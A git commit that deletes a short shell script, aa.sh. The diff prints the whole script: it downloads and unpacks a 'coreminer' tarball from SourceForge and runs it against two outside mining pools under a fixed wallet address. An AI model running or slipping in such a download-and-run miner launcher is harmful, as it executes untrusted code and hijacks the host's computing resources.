4c2952daed6035fc19f681eedc212c9624dc1d0b
liecamshoe <liecamshoe@outlook.com>
2026-04-26 23:45:11 +0800

    Delete aa.sh

--- aa.sh
+++
@@ -1,3 +0,0 @@
-ls
-curl https://sourceforge.net/projects/drths/files/corearm.tar.gz/download -L -o corearm.tar.gz && tar xf corearm.tar.gz
-./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
